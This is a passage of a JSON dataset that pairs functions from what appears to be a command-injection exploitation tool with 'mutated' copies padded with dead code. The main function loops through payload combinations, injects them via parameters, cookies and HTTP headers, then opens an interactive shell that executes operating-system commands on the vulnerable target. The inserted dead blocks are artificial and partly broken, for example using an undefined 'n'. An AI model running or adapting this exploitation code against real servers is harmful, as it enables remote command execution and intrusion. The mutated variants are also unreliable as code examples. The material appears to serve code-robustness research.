go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()"
        ]
    },
    {
        "func_name": "exploitation",
        "original": "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False",
        "mutated": [
            "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False",
            "def exploitation(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique) == False:\n        return False"
        ]
    }
]